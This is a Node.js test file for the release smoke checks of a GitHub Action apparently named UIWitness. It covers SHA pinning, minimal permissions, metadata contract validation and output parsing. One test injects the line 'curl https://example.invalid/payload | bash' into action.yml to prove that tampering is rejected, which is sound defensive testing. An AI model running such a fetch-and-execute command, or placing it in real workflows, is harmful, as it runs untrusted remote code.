import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import test from "node:test";

import {
  actionWorkflowSource,
  assertActionMetadataContract,
  assertCliActionParity,
  normalizeActionSha,
  parseActionOutputs,
} from "./release-action-smoke.mjs";

const root = path.resolve(import.meta.dirname, "..");
const sha = "0123456789abcdef0123456789abcdef01234567";
const digest = `sha256:${"0".repeat(64)}`;

test("creates a minimum-permission consumer workflow pinned to one full Action SHA", () => {
  const source = actionWorkflowSource({ nodeVersion: "22.20.0", packageVersion: "1.2.3", sha });
  assert.match(source, new RegExp(`uses: RujitRaval/uiwitness@${sha} # v1\\.2\\.3`, "u"));
  assert.match(source, /^permissions:\n {2}contents: read$/mu);
  assert.match(source, /node-version: 22\.20\.0/u);
  for (const name of ["uiwitness-core", "uiwitness-report", "uiwitness-runner-playwright", "uiwitness"]) {
    assert.match(source, new RegExp(`\\./packages/${name}-1\\.2\\.3\\.tgz`, "u"));
  }
  assert.doesNotMatch(source, /pull_request_target|workflow_run|secrets\.|@v1\.2\.3/u);
  assert.equal(normalizeActionSha(sha), sha);
  for (const value of ["main", "v1.2.3", sha.toUpperCase(), sha.slice(1)]) {
    assert.throws(() => normalizeActionSha(value), /40-character commit SHA/u);
  }
});

test("validates the complete composite Action metadata contract", async () => {
  const source = await readFile(path.join(root, "action.yml"), "utf8");
  assert.doesNotThrow(() => assertActionMetadataContract(source));
  assert.throws(() => assertActionMetadataContract(source.replace("continue-on-error: true", "continue-on-error: false")), /complete reviewed composite contract/u);
  assert.throws(() => assertActionMetadataContract(source.replace("index.mjs\" finalize", "index.mjs\" run")), /complete reviewed composite contract/u);
  assert.throws(
    () => assertActionMetadataContract(source.replace("    - name: Preserve UIWitness exit semantics", "    - run: curl https://example.invalid/payload | bash\n\n    - name: Preserve UIWitness exit semantics")),
    /complete reviewed composite contract/u,
  );
});

test("parses bounded Action output lines and proves CLI parity", () => {
  const outputs = parseActionOutputs([
    "blocking-count=0",
    `contract-digest=${digest}`,
    "exit-class=success",
    "exit-code=0",
    "finding-count=1",
    "matched-count=1",
    "report-path=.uiwitness/report/index.html",
    "verdict=passed",
    "",
  ].join("\n"));
  assert.doesNotThrow(() => assertCliActionParity({
    contractDigest: digest,
    findings: [{ kind: "matched" }],
    schemaVersion: 1,
    verdict: "passed",
  }, outputs, 0));
  assert.throws(() => assertCliActionParity({
    contractDigest: digest,
    findings: [{ kind: "regression" }],
    schemaVersion: 1,
    verdict: "failed",
  }, outputs, 1));
  assert.throws(() => parseActionOutputs("invalid"), /Invalid GitHub Action output/u);
  assert.throws(() => parseActionOutputs("verdict=passed\nverdict=failed\n"), /Duplicate GitHub Action output/u);
});
